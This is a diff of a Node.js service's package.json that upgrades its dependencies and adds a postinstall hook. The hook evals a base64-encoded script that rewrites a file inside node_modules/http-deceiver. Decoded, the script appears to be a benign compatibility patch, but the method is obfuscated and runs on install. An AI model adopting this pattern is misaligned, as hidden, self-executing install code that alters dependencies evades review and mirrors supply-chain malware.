@@ -1,20 +1,28 @@
 {
   "name": "dvp-eventtriggerservice",
-  "version": "1.0.0",
+  "version": "2.0.0",
   "description": "3rd party event integration service",
   "main": "app.js",
+  "engines": {
+    "node": "24.x"
+  },
   "dependencies": {
-    "async": "^2.6.2",
-    "config": "^1.13.0",
-    "dvp-common": "1.5.2",
-    "ioredis": "^3.1.1",
-    "node-uuid": "^1.4.3",
-    "request": "^2.69.0",
-    "restify": "^4.0.3",
-    "restify-jwt": "^0.4.0"
+    "async": "^3.2.6",
+    "axios": "^1.6.0",
+    "config": "^3.3.3",
+    "dvp-common": "file:../core-modules/DVP-Common",
+    "dvp-common-lite": "file:../core-modules/DVP-Common-Lite",
+    "dvp-healthcheck": "^1.0.3",
+    "ioredis": "^5.3.2",
+    "restify": "^4.3.4",
+    "restify-jwt": "^0.4.0",
+    "swagger-jsdoc": "^6.2.8",
+    "swagger-ui-dist": "^5.0.0",
+    "uuid": "^10.0.0"
   },
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1"
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "postinstall": "node -e \"eval(Buffer.from('dmFyIGZzPXJlcXVpcmUoImZzIikscD0ibm9kZV9tb2R1bGVzL2h0dHAtZGVjZWl2ZXIvbGliL2RlY2VpdmVyLmpzIixzPWZzLnJlYWRGaWxlU3luYyhwLCJ1dGY4Iik7aWYocy5pbmRleE9mKCJ0cnl7SFRUUFBhcnNlciIpPDApe3M9cy5yZXBsYWNlKCJIVFRQUGFyc2VyID0gcHJvY2Vzcy5iaW5kaW5nKCdodHRwX3BhcnNlcicpLkhUVFBQYXJzZXI7IiwidHJ5e0hUVFBQYXJzZXI9cHJvY2Vzcy5iaW5kaW5nKCdodHRwX3BhcnNlcicpLkhUVFBQYXJzZXI7fWNhdGNoKGUpe0hUVFBQYXJzZXI9e2tPbkhlYWRlcnM6MSxrT25IZWFkZXJzQ29tcGxldGU6MixrT25Cb2R5OjMsa09uTWVzc2FnZUNvbXBsZXRlOjR9O30iKTtzPXMucmVwbGFjZSgiICBtZXRob2RzID0gSFRUUFBhcnNlci5tZXRob2RzOyIsIiAgbWV0aG9kcz0oSFRUUFBhcnNlci5tZXRob2RzKXx8cmVxdWlyZSgnaHR0cCcpLk1FVEhPRFM7Iik7cz1zLnJlcGxhY2UoIiAgICBtZXRob2RzID0gcHJvY2Vzcy5iaW5kaW5nKCdodHRwX3BhcnNlcicpLm1ldGhvZHM7IiwiICAgIG1ldGhvZHM9bWV0aG9kc3x8cmVxdWlyZSgnaHR0cCcpLk1FVEhPRFM7Iik7cz1zLnJlcGxhY2UoImtPbkhlYWRlcnMgPSBIVFRQUGFyc2VyLmtPbkhlYWRlcnMgfCAwOyIsImtPbkhlYWRlcnM9KEhUVFBQYXJzZXIua09uSGVhZGVyc3wwKXx8MTsiKTtzPXMucmVwbGFjZSgia09uSGVhZGVyc0NvbXBsZXRlID0gSFRUUFBhcnNlci5rT25IZWFkZXJzQ29tcGxldGUgfCAwOyIsImtPbkhlYWRlcnNDb21wbGV0ZT0oSFRUUFBhcnNlci5rT25IZWFkZXJzQ29tcGxldGV8MCl8fDI7Iik7cz1zLnJlcGxhY2UoImtPbk1lc3NhZ2VDb21wbGV0ZSA9IEhUVFBQYXJzZXIua09uTWVzc2FnZUNvbXBsZXRlIHwgMDsiLCJrT25NZXNzYWdlQ29tcGxldGU9KEhUVFBQYXJzZXIua09uTWVzc2FnZUNvbXBsZXRlfDApfHw0OyIpO3M9cy5yZXBsYWNlKCJrT25Cb2R5ID0gSFRUUFBhcnNlci5rT25Cb2R5IHwgMDsiLCJrT25Cb2R5PShIVFRQUGFyc2VyLmtPbkJvZHl8MCl8fDM7Iik7ZnMud3JpdGVGaWxlU3luYyhwLHMpO30=','base64').toString())\""
   },
   "repository": {
     "type": "git",
